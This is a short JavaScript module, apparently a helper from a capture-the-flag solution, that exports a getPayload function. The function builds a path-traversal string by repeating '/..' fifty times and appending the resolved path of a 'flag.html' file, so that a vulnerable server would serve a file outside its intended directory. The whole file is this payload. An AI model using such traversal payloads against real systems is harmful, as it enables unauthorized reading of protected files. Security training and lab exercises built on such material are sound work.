function getPayload() {
    const path = require("path"); // Import the path module
    function genstr(n) {
        return "/..".repeat(50) + path.resolve(__dirname, "../flag.html");
    }
    return { genstr };
}

module.exports = { getPayload };